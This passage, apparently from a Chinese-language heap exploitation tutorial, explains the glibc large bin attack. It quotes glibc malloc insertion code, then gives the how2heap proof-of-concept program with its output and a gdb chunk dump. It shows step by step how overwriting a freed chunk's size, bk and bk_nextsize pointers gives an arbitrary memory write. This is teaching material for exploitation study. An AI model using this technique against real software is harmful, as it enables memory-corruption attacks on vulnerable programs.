            assert (chunk_main_arena (fwd));
        }
        if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
            /* Always insert in the second position.  */
            fwd = fwd->fd;
        else
        {
            victim->fd_nextsize = fwd;
            victim->bk_nextsize = fwd->bk_nextsize;
            fwd->bk_nextsize = victim;
            victim->bk_nextsize->fd_nextsize = victim;
        }
        bck = fwd->bk;
    }
否则，我们从链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表，找到后判断链表的 size
是否等于待插入chunk的size，如果相等，直接将这个 chunk 插入到当前链表的第二个位置，如果不相等，说明待插入的chunk比当前链表头结点的
size 大，那么我们将待插入的chunk作为当前链表的头结点，插入到符合size的bin index后
### how2heap large_bin_attack
    #include
    #include
    int main()
    {
        fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n");
        fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
        fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
               "global variable global_max_fast in libc for further fastbin attack\n\n");
        unsigned long stack_var1 = 0;
        unsigned long stack_var2 = 0;
        fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
        fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
        fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
        unsigned long *p1 = malloc(0x320);
        fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the first large chunk during the free()\n\n");
        malloc(0x20);
        unsigned long *p2 = malloc(0x400);
        fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the second large chunk during the free()\n\n");
        malloc(0x20);
        unsigned long *p3 = malloc(0x400);
        fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
               " the third large chunk during the free()\n\n");
        malloc(0x20);
        free(p1);
        free(p2);
        fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
               " [ %p  %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
        malloc(0x90);
        fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
        free(p3);
        fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
               " [ %p  %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
        //------------VULNERABILITY-----------    
        fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
                " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
        fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
                " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
                " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
        p2[-1] = 0x3f1;
        p2[0] = 0;
        p2[2] = 0;
        p2[1] = (unsigned long)(&stack_var1 - 2);
        p2[3] = (unsigned long)(&stack_var2 - 4);
        //------------------------------------    
        malloc(0x90);
        fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
                " During this time, targets should have already been rewritten:\n");
        fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
        fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
        return 0;
    }
    This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.
    This file demonstrates large bin attack by writing a large unsigned long value into stack
    In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    Let's first look at the targets we want to rewrite on stack:
    stack_var1 (0x7ffc6975ac60): 0
    stack_var2 (0x7ffc6975ac68): 0
    Now, we allocate the first large chunk on the heap at: 0x1b31000
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()
    Then, we allocate the second large chunk on the heap at: 0x1b31360
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()
    Finally, we allocate the third large chunk on the heap at: 0x1b317a0
    And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()
    We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x1b31360  0x1b31000 ]
    Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x1b310a0 ]
    Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x1b317a0  0x1b310a0 ]
    Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
    Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2
    Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
    stack_var1 (0x7ffc6975ac60): 0x1b317a0
    stack_var2 (0x7ffc6975ac68): 0x1b317a0
让我们简化一下代码把注释部分去掉
    unsigned long *p1 = malloc(0x320);
    malloc(0x20);
    unsigned long *p2 = malloc(0x400);
    malloc(0x20);
    unsigned long *p3 = malloc(0x400);
    malloc(0x20);
    free(p1);
    free(p2);
    malloc(0x90);
    free(p3);
在VULNERABILITY之前我们的chunk结构如下
    last_remainder: 0x6030a0 (size : 0x290)
         unsortbin: 0x6037a0 (size : 0x410)  0x6030a0 (size : 0x290)
      largebin[ 0]: 0x603360 (size : 0x410)
    0x6030a0 PREV_INUSE struct malloc_chunk {
    prev_size   = 0x0
    size        = 0x291
    fd          = 0x7ffff7dd1df8
    bk          = 0x6037a0
    fd_nextsize = 0x0
    bk_nextsize = 0x0
    0x603360 PREV_INUSE struct malloc_chunk {
    prev_size   = 0x0
    size        = 0x411
    fd          = 0x7ffff7dd1f68
    bk          = 0x7ffff7dd1f68
    fd_nextsize = 0x603360
    bk_nextsize = 0x603360
    0x6037a0 PREV_INUSE struct malloc_chunk {
    prev_size   = 0x0
    size        = 0x411
    fd          = 0x6030a0
    bk          = 0x7ffff7dd1b78
    fd_nextsize = 0x0
    bk_nextsize = 0x0
我们可以看出p2在largebin中，p1和p3在unsorted bin中
    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);
接下来我们修改了p2的chunk，将size改小，将bk指向&stack_var1-0x10，将bk_nextsize指向&stack_var2 -0x20
接下来我们malloc一个堆块，使p3进入largebin，然后将栈上的两个变量改为p3
我们来分析一下其中的步骤
malloc一个堆块，此时fastbin为空，我们会去unsortedbin历遍寻找，但p3的size不在smallbin的范围内，p3的size大于p2(0x3f1)，p3插入large
bin的头结点，并执行以下操作
    else
    {
         victim->fd_nextsize = fwd;
         victim->bk_nextsize = fwd->bk_nextsize;
         fwd->bk_nextsize = victim;
         victim->bk_nextsize->fd_nextsize = victim;
    }
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
victim为p3，fwd为p2
通过上面代码我们可以实现fwd->bk_nextsize->fd_nextsize=victim，fwd->bk=victim，修改fwd的bk和bk_size
我们这样通过构造 nextsize 双向链表，使得栈上的两个变量变为p3，最终可以实现任意地址写
### 参考链接